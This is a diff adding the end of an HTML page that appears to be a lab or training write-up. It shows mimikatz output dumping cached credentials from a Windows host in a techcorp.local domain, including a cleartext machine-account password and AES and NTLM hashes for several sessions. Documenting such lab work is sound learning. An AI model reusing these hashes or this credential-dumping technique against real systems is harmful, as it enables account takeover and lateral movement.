+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 17212586 (00000000:0106a4aa)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:44:46 AM
+SID               : S-1-5-96-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 23912 (00000000:00005d68)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:21 AM
+SID               : S-1-5-96-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 17403124 (00000000:01098cf4)
+Session           : RemoteInteractive from 2
+User Name         : webmaster
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 7/7/2024 2:45:01 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1140
+
+         * Username : webmaster
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
+           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
+           rc4_md4           23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : US-WEB$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:20 AM
+SID               : S-1-5-18
+
+         * Username : us-web$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 17217309 (00000000:0106b71d)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:44:47 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 40963 (00000000:0000a003)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:22 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : US-WEB$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:21 AM
+SID               : S-1-5-20
+
+         * Username : us-web$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 23822 (00000000:00005d0e)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:21 AM
+SID               : S-1-5-96-0-0
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 17404225 (00000000:01099141)
+Session           : RemoteInteractive from 2
+User Name         : webmaster
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 7/7/2024 2:45:01 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1140
+
+         * Username : webmaster
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
+           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
+           rc4_md4           23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f
+
+Authentication Id : 0 ; 40984 (00000000:0000a018)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:08:22 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&amp;&#x27;Sp!ykctIPCm,&lt;n2;rR$*y1ThkKCMjzP 7zmH&#x27;V)CTjF9@;R&lt;nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%&gt;?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+mimikatz(commandline) # exit</code></pre>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
